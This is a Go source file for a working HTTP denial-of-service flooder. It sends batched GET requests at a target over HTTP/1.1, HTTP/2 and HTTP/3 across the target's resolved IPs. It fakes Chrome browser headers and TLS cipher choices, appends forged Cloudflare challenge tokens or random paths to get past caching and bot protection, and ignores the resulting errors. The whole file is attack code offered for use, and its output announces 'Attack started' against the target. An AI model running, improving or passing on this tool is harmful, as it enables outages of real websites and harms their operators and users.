package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"
	"golang.org/x/net/http2"
)

// Global Stats
var (
	reqs      uint64
	errors    uint64
	running   bool = true
	UserAgent string
	Cookie    string
)

// Configuration
type Config struct {
	TargetURL string
	Duration  int
	Threads   int
	RPS       int // Acts as BatchSize in the new logic
	Mode      string
	QueryMode int
	Debug     bool
}

var GlobalConfig Config

func main() {

	// Usage: ./flooder <target> <time> <threads> <rps> --cookie "..." --ua "..." --http 1/2/3/mix

	if len(os.Args) < 5 {
		fmt.Println("Usage: ./flooder <target> <time> <threads> <rps> [--cookie \"...\"] [--ua \"...\"] [--http 1/2/3/mix] [--debug]")
		os.Exit(1)
	}

	config := Config{
		TargetURL: os.Args[1],
	}

	var err error
	config.Duration, err = strconv.Atoi(os.Args[2])
	if err != nil {
		panic("Invalid time")
	}
	config.Threads, err = strconv.Atoi(os.Args[3])
	if err != nil {
		panic("Invalid threads")
	}
	config.RPS, err = strconv.Atoi(os.Args[4])
	if err != nil {
		panic("Invalid RPS/BatchSize")
	}

	// Parse flags
	fs := flag.NewFlagSet("flooder", flag.ContinueOnError)
	var cookieFlag, uaFlag, httpFlag string
	var debugFlag bool
	fs.StringVar(&cookieFlag, "cookie", "", "Cookie")
	fs.StringVar(&uaFlag, "ua", "Go-Flooder/2.0", "User-Agent")
	fs.StringVar(&httpFlag, "http", "mix", "HTTP Mode: 1, 2, 3, or mix")
	fs.BoolVar(&debugFlag, "debug", false, "Enable debug mode")

	var queryFlag int
	fs.IntVar(&queryFlag, "query", 0, "Query Mode: 0 (None), 1 (CF), 2 (Path), 3 (Random)")

	if len(os.Args) > 5 {
		fs.Parse(os.Args[5:])
	}

	Cookie = cookieFlag
	UserAgent = uaFlag
	config.Mode = httpFlag
	config.QueryMode = queryFlag
	config.Debug = debugFlag

	GlobalConfig = config

	// Resolve IPs for H3 distribution
	u, _ := url.Parse(config.TargetURL)
	ips, lookupErr := net.LookupIP(u.Hostname())
	var ipv4List, ipv6List []string
	if lookupErr == nil {
		for _, ip := range ips {
			if ip.To4() != nil {
				ipv4List = append(ipv4List, ip.String())
			} else {
				ipv6List = append(ipv6List, fmt.Sprintf("[%s]", ip.String()))
			}
		}
	} else {
		fmt.Println("DNS Lookup failed, using hostname only.")
	}

	fmt.Printf("Attack started on %s\n", config.TargetURL)
	fmt.Printf("Time: %ds | Threads: %d | Batch Size: %d | Mode: %s\n", config.Duration, config.Threads, config.RPS, config.Mode)
	if len(ipv4List) > 0 || len(ipv6List) > 0 {
		fmt.Printf("Resolved IPs -> IPv4: %d | IPv6: %d\n", len(ipv4List), len(ipv6List))
	}
	fmt.Println("------------------------------------------------")

	// Maximize CPU usage
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Context for cancellation
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(config.Duration)*time.Second)
	defer cancel()

	// Handle signals
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGHUP, syscall.SIGCHLD, os.Interrupt)
	go func() {
		<-sigChan
		cancel()
	}()

	var wg sync.WaitGroup

	// Determine Thread Distribution
	h1Threads := 0
	h3Threads := 0

	switch config.Mode {
	case "1", "2": // H1/H2 handled by same client mostly, but we can tune transport. Treating as Standard HTTP client.
		h1Threads = config.Threads
	case "3":
		h3Threads = config.Threads
	case "mix":
		h3Threads = config.Threads / 2
		h1Threads = config.Threads - h3Threads
	default:
		h1Threads = config.Threads // Default to standard
	}

	// --- HTTP/1.1 & HTTP/2 WORKERS ---
	if h1Threads > 0 {
		t1 := &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				NextProtos:         []string{"h2", "http/1.1"},
			},
			MaxIdleConns:        0,
			MaxIdleConnsPerHost: 0,
			MaxConnsPerHost:     0,
			DisableCompression:  true,
			DisableKeepAlives:   false,
			ForceAttemptHTTP2:   true,
		}
		// H2 Tuning
		h2t, err := http2.ConfigureTransports(t1)
		if err == nil {
			h2t.StrictMaxConcurrentStreams = false
		}

		client := &http.Client{
			Transport: t1,
			Timeout:   15 * time.Second,
		}

		for i := 0; i < h1Threads; i++ {
			wg.Add(1)

			// Select IP (Round Robin / Random)
			var targetIP string
			if len(ipv6List) > 0 && len(ipv4List) > 0 {
				if i%2 != 0 {
					targetIP = ipv6List[rand.Intn(len(ipv6List))]
				} else {
					targetIP = ipv4List[rand.Intn(len(ipv4List))]
				}
			} else if len(ipv6List) > 0 {
				targetIP = ipv6List[rand.Intn(len(ipv6List))]
			} else if len(ipv4List) > 0 {
				targetIP = ipv4List[rand.Intn(len(ipv4List))]
			} else {
				targetIP = "" // Fallback
			}

			go func(ip string) {
				defer wg.Done()
				workerStandard(ctx, client, config.TargetURL, ip, config.RPS, u.Hostname())
			}(targetIP)
		}
	}

	// --- HTTP/3 WORKERS ---
	if h3Threads > 0 {
		// Round Robin Logic for IPs
		for i := 0; i < h3Threads; i++ {
			wg.Add(1)

			// Select IP
			var targetIP string
			if len(ipv6List) > 0 && len(ipv4List) > 0 {
				if i%2 != 0 {
					targetIP = ipv6List[rand.Intn(len(ipv6List))]
				} else {
					targetIP = ipv4List[rand.Intn(len(ipv4List))]
				}
			} else if len(ipv6List) > 0 {
				targetIP = ipv6List[rand.Intn(len(ipv6List))]
			} else if len(ipv4List) > 0 {
				targetIP = ipv4List[rand.Intn(len(ipv4List))]
			} else {
				targetIP = "" // Fallback to DNS if no IPs
			}

			go func(ip string) {
				defer wg.Done()
				workerH3(ctx, config.TargetURL, ip, config.RPS, u.Hostname())
			}(targetIP)
		}
	}

	// Stats Printer
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case <-time.After(1 * time.Second):
				r := atomic.LoadUint64(&reqs)
				e := atomic.LoadUint64(&errors)
				atomic.StoreUint64(&reqs, 0)
				atomic.StoreUint64(&errors, 0)
				fmt.Printf("RPS: %d | Errors: %d\n", r, e)
			}
		}
	}()

	wg.Wait()
	fmt.Println("Attack finished.")
}

// --- STANDARD WORKER (H1/H2) ---
func workerStandard(ctx context.Context, client *http.Client, urlStr string, targetIP string, batchSize int, hostHeader string) {
	// We need base URL object for query building
	baseU, _ := url.Parse(urlStr)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Batch Loop
			var batchWg sync.WaitGroup
			for i := 0; i < batchSize; i++ {
				batchWg.Add(1)
				go func() {
					defer batchWg.Done()

					// Dynamic URL and Headers per request
					finalURL := buildQueryUrl(baseU, GlobalConfig.QueryMode)
					req, err := http.NewRequest("GET", finalURL, nil)
					if err != nil {
						return
					}

					// Apply Spoofing
					spoofHeaders(req, hostHeader, UserAgent, Cookie)

					// Fast execution
					resp, err := client.Do(req)
					if err != nil {
						if GlobalConfig.Debug {
							fmt.Println("[DEBUG][STD] Error:", err)
						}
						if shouldIgnore(err) {
							return
						}
						atomic.AddUint64(&errors, 1)
						return
					}
					if GlobalConfig.Debug {
						fmt.Println("[DEBUG][STD] Success:", resp.StatusCode)
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&reqs, 1)
				}()
			}
			batchWg.Wait()
		}
	}
}

// --- HTTP/3 WORKER ---
func workerH3(ctx context.Context, originalURL string, targetIP string, batchSize int, hostHeader string) {
	// Setup H3 Transport
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},
		ServerName:         hostHeader, // SNI must be correct
		// Tambahkan CipherSuites yang biasa digunakan Chrome
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
	}

	quicConfig := &quic.Config{
		HandshakeIdleTimeout:       10 * time.Second,
		MaxIncomingStreams:         120,
		InitialStreamReceiveWindow: 1048576,
		MaxStreamReceiveWindow:     1048576,
		KeepAlivePeriod:            10 * time.Second,
	}

	tr := &http3.Transport{
		TLSClientConfig: tlsConfig,
		QUICConfig:      quicConfig,
	}
	defer tr.CloseIdleConnections()

	client := &http.Client{
		Transport: tr,
		Timeout:   15 * time.Second,
	}

	// Base URL logic
	u, _ := url.Parse(originalURL)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			var batchWg sync.WaitGroup
			for i := 0; i < batchSize; i++ {
				batchWg.Add(1)
				go func() {
					defer batchWg.Done()

					// Build URL with Query First (on domain)
					finalMsgURL := buildQueryUrl(u, GlobalConfig.QueryMode)

					// Then replace Host with IP if needed
					reqURL := finalMsgURL
					if targetIP != "" {
						// Safe IP handling for IPv6
						safeIP := targetIP
						if strings.Contains(targetIP, ":") && !strings.Contains(targetIP, "[") {
							safeIP = "[" + targetIP + "]"
						}
						reqURL = strings.Replace(finalMsgURL, u.Host, safeIP+":443", 1)
					}

					req, err := http.NewRequest("GET", reqURL, nil)
					if err != nil {
						return
					}

					// Force Host Header & Spoof
					req.Host = hostHeader
					spoofHeaders(req, hostHeader, UserAgent, Cookie)

					resp, err := client.Do(req)
					if err != nil {
						if shouldIgnore(err) {
							return
						}
						atomic.AddUint64(&errors, 1)
						return
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&reqs, 1)
				}()
			}
			batchWg.Wait()
		}
	}
}

// --- ERROR HANDLING CONFIG ---
var ignoreErrors = []string{
	"RequestError", "StatusCodeError", "CaptchaError", "CloudflareError",
	"ParseError", "ParserError", "TimeoutError", "JSONError", "URLError",
	"InvalidURL", "ProxyError", "SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET",
	"ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT",
	"ESOCKETTIMEDOUT", "EPROTO", "EAI_AGAIN", "EHOSTDOWN", "ENETRESET",
	"ENETUNREACH", "ENONET", "ENOTCONN", "ENOTFOUND", "EAI_NODATA",
	"EAI_NONAME", "EADDRNOTAVAIL", "EAFNOSUPPORT", "EALREADY", "EBADF",
	"ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "EIDRM", "EILSEQ",
	"EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK",
	"EMSGSIZE", "ENAMETOOLONG", "ENETDOWN", "ENOBUFS", "ENODEV", "ENOENT",
	"ENOMEM", "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY",
	"ENOTSOCK", "EOPNOTSUPP", "EPERM", "EPROTONOSUPPORT", "ERANGE", "EROFS",
	"ESHUTDOWN", "ESPIPE", "ESRCH", "ETIME", "ETXTBSY", "EXDEV", "UNKNOWN",
	"DEPTH_ZERO_SELF_SIGNED_CERT", "UNABLE_TO_VERIFY_LEAF_SIGNATURE",
	"CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID", "connection reset",
	"broken pipe", "stream error",
	"context deadline exceeded", "Client.Timeout exceeded", "request canceled", "deadline exceeded",
}

func shouldIgnore(err error) bool {
	if err == nil {
		return true
	}
	msg := err.Error()
	for _, ignore := range ignoreErrors {
		if strings.Contains(msg, ignore) {
			return true
		}
	}
	return false
}

// --- SPOOFING HELPERS ---

func buildQueryUrl(u *url.URL, mode int) string {
	base := u.String()
	separator := "?"
	if strings.Contains(base, "?") {
		separator = "&"
	}

	switch mode {
	case 1:
		tk := fmt.Sprintf("__cf_chl_rt_tk=%s_%s-%d-0-gaNy%s",
			randStr(30), randStr(12), time.Now().Unix(), randStr(8))
		return base + separator + tk
	case 2:
		parsed, _ := url.Parse(base)
		parsed.Path += "/" + randStr(8)
		return parsed.String()
	case 3:
		q := fmt.Sprintf("q=%s&%s", randStr(6), randStr(7))
		return base + separator + q
	default:
		return base
	}
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randInt(min, max int) int {
	return rand.Intn(max-min+1) + min
}

func spoofHeaders(req *http.Request, host string, customUA string, customCookie string) {
	randomNum := randInt(100000, 999999)

	h := req.Header
	h.Set("Host", host)
	h.Set("Connection", "keep-alive")
	h.Set("sec-ch-ua", fmt.Sprintf(`"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"`))
	h.Set("sec-ch-ua-mobile", "?0")
	h.Set("sec-ch-ua-platform", `"Windows"`)

	if customUA != "" {
		h.Set("User-Agent", customUA)
	} else {
		h.Set("User-Agent", fmt.Sprintf("None/5.%d", randomNum))
	}

	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	h.Set("Sec-Fetch-Site", "none")
	h.Set("Sec-Fetch-Mode", "navigate")
	h.Set("Sec-Fetch-User", "?1")
	h.Set("Sec-Fetch-Dest", "document")
	h.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	h.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")

	if customCookie != "" {
		h.Set("Cookie", customCookie)
	}
}
